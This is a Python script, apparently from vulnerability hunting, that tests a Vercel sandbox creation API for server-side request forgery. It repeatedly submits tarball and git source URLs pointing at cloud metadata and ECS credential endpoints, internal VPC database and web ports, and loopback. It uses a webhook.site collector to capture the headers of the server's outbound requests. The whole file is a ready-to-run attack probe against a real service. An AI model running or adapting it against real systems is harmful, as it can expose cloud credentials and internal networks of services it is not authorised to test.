# -*- coding: utf-8 -*-
"""v223: v4 source 服务端拉取 SSRF 测试 (tarball/git URL)
控制: 公网 httpbin/webhook.site -> 观察 webhook 请求头
内网: IMDS/ECS/VPC-PG/loopback-sandboxctrl
判定: 创建成功/失败/超时差异 + webhook 捕获"""
import json, sys, time, urllib.request
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

UUID = open('_wh_uuid.txt').read().strip()


def log(s): print(s, flush=True)


def v4(src, tag, wait=100):
    api("DELETE", "/v2/sandboxes/srcv223?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)
    body = {"projectId": PROJ, "name": "srcv223", "source": src}
    t0 = time.time()
    c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, wait)
    dt = time.time() - t0
    log('[%s] -> %d dt=%.1f | %s' % (tag, c, dt, (r[:300] if r else '').replace(chr(10), ' ')))
    api("DELETE", "/v2/sandboxes/srcv223?teamId=%s&projectId=%s" % (TEAM, PROJ))
    time.sleep(2)


def wh_req():
    req = urllib.request.Request('https://webhook.site/token/%s/requests?sorting=newest' % UUID)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read())
    except Exception as e:
        log('wh err %s' % e)
        return {'data': []}


if __name__ == '__main__':
    log('===== tarball source =====')
    v4({"type": "tarball", "url": "https://webhook.site/%s/t1" % UUID}, 'tb-webhook')
    v4({"type": "tarball", "url": "http://httpbin.org/anything"}, 'tb-httpbin')
    v4({"type": "tarball", "url": "http://169.254.169.254/latest/meta-data/"}, 'tb-imds')
    v4({"type": "tarball", "url": "http://169.254.170.2/credentials"}, 'tb-ecs')
    v4({"type": "tarball", "url": "http://172.31.0.2:5432/"}, 'tb-pg')
    v4({"type": "tarball", "url": "http://172.31.0.2/"}, 'tb-vpc80')
    v4({"type": "tarball", "url": "http://10.0.0.2:5432/"}, 'tb-10pg')
    v4({"type": "tarball", "url": "http://127.0.0.1:23456/"}, 'tb-lo23456')
    v4({"type": "tarball", "url": "http://nonexistent-xyz-12345.invalid/x.tar.gz"}, 'tb-badhost')

    log('')
    log('===== git source =====')
    v4({"type": "git", "url": "https://webhook.site/%s/g1" % UUID}, 'git-webhook')
    v4({"type": "git", "url": "http://169.254.169.254/latest/meta-data/"}, 'git-imds')
    v4({"type": "git", "url": "http://172.31.0.2/"}, 'git-vpc80')
    v4({"type": "git", "url": "http://172.31.0.2:5432/"}, 'git-pg')
    v4({"type": "git", "url": "http://127.0.0.1:23456/"}, 'git-lo23456')
    v4({"type": "git", "url": "http://nonexistent-xyz-12345.invalid/repo.git"}, 'git-badhost')

    log('')
    log('===== webhook.site captured =====')
    d = wh_req()
    reqs = d.get('data', [])
    log('total=%d' % len(reqs))
    for i, rq in enumerate(reqs[:8]):
        log('--- %d ---' % i)
        log('method=%s url=%s' % (rq.get('method'), rq.get('url')))
        log('headers: %s' % json.dumps(rq.get('headers', {}))[:800])
    log('DONE')
